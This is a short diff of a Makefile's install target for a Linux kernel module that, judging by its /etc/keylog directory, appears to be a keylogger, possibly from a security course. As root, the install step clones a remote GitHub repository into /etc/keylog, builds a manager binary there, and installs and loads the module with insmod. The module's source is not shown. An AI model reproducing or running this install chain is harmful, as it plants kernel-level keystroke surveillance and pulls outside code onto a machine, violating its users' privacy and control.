@@ -26,14 +26,12 @@ unload:
 	-rmmod $(modname)
 
 install:
-	gcc manager.c -o manager.o
+	git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
+	gcc manager.c -o /etc/keylog/manager.o
 	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
 	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
 	depmod -a
 	insmod $(modname).ko
-	git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
-	mv manager.o /etc/keylog
-	cp ../run_update.sh /etc/keylog
 
 uninstall:
 	rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
